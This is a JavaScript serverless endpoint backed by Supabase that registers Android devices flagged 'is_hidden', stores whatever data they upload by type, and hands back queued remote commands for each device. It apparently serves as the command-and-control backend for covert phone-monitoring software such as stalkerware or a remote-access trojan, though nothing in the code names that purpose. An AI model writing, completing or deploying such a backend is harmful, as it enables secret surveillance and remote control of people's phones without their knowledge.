import { createClient } from '@supabase/supabase-js';

const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_SERVICE_KEY
);

export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { device_id, token, data_type, data, device_info } = req.body;
    
    // Validate token
    const { data: tokenData, error: tokenError } = await supabase
      .from('user_tokens')
      .select('user_id')
      .eq('token', token)
      .single();

    if (tokenError || !tokenData) {
      return res.status(401).json({ error: 'Invalid token' });
    }

    const userId = tokenData.user_id;

    // Update device info
    await supabase.from('devices').upsert({
      device_id,
      user_id: userId,
      device_model: device_info?.model,
      android_version: device_info?.android_version,
      battery_level: device_info?.battery,
      network_type: device_info?.network,
      last_seen: new Date().toISOString(),
      is_hidden: true
    });

    // Save device data
    const { error: dataError } = await supabase
      .from('device_data')
      .insert({
        device_id,
        data_type,
        data,
        created_at: new Date().toISOString()
      });

    if (dataError) {
      console.error('Error saving data:', dataError);
    }

    // Get pending commands
    const { data: pendingCommands } = await supabase
      .from('commands')
      .select('*')
      .eq('device_id', device_id)
      .eq('status', 'pending')
      .order('created_at', { ascending: true });

    // Update command status
    if (pendingCommands && pendingCommands.length > 0) {
      const commandIds = pendingCommands.map(cmd => cmd.id);
      await supabase
        .from('commands')
        .update({ status: 'sent' })
        .in('id', commandIds);
    }

    // Update data count
    await supabase.rpc('increment_data_count', { target_device_id: device_id });

    res.status(200).json({
      success: true,
      commands: pendingCommands || [],
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
}
